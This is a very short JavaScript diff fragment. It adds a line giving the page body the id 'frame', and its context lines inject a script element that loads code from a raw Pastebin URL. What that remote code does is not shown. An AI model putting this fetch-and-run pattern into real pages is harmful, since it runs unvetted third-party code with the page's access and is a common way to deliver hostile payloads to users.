@@ -1,3 +1,5 @@
+document.body.id="frame"
+
 const script = document.createElement('script');
 script.src = 'https://pastebin.com/raw/BAE0GeBY';
 
